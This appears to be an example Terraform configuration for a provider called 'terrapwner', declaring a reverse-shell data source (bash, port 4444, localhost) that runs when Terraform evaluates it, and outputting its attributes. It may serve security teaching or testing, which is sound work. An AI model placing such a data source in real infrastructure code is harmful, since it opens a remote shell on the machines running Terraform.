terraform {
  required_providers {
    terrapwner = {
      source = "hashicorp.com/edu/terrapwner"
    }
  }
}

provider "terrapwner" {}

# Example 1: Basic reverse shell with default settings
data "terrapwner_reverse_shell" "basic" {
  host    = "127.0.0.1"
  port    = 4444
  shell   = "bash"
  timeout = 600
}

# Output all attributes for each data source
output "basic_shell" {
  description = "All attributes from the basic reverse shell"
  value       = data.terrapwner_reverse_shell.basic
}
